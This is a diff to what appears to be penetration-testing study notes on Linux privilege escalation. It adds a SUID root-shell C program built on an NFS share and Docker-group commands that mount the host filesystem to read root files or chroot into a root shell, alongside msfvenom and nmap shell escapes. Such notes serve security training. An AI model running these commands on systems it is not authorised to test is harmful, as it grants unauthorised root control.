@@ -483,6 +483,12 @@ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 chmod +xs /tmp/nfs/shell.elf
 ```
 
+```
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/pwn.c
+gcc /tmp/nfs/pwn.c -o /tmp/nfs/pwn
+chmod +s pwn
+```
+
 ## Tips and tricks
 #### Exploiting path on binary
 If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
@@ -507,3 +513,23 @@ nmap --interactive
 whoami
 #root
 ```
+
+### Docker
+#### Check access to docker group
+```
+id
+```
+
+#### Read files example
+```
+docker run -v /root:/mnt alpine cat /mnt/proof.txt
+```
+
+### Get system shell
+```
+docker run -it -v /:/mnt alpine chroot /mnt
+```
+
+#### Break out of shell
+https://github.com/s0wr0b1ndef/OSCP-note/blob/master/gain%20access/shells/spawn_shell_or%20break_out_of_jail.txt
+
